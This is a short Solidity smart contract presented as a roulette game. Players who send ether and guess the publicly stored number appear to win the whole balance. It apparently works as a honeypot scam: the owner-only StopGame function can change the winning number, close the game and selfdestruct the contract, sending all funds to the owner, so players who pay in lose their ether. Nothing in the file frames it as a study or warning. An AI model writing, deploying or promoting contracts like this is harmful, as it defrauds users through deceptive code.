1 pragma solidity ^0.4.20;
2 
3 contract TestingR
4 {
5 
6     uint8 public result = 0;
7 
8     bool finished = false;
9 
10     address rouletteOwner;
11 
12     function Play(uint8 _number)
13     external
14     payable
15     {
16         require(msg.sender == tx.origin);
17         if(result == _number && msg.value>0.01 ether && !finished)
18         {
19             msg.sender.transfer(this.balance);
20             GiftHasBeenSent();
21         }
22     }
23 
24     function StartRoulette(uint8 _number)
25     public
26     payable
27     {
28         if(result==0)
29         {
30             result = _number;
31             rouletteOwner = msg.sender;
32         }
33     }
34 
35     function StopGame(uint8 _number)
36     public
37     payable
38     {
39         require(msg.sender == rouletteOwner);
40         GiftHasBeenSent();
41         result = _number;
42         if (msg.value>0.008 ether){
43             selfdestruct(rouletteOwner);
44         }
45     }
46 
47     function GiftHasBeenSent()
48     private
49     {
50         finished = true;
51     }
52 
53     function() public payable{}
54 }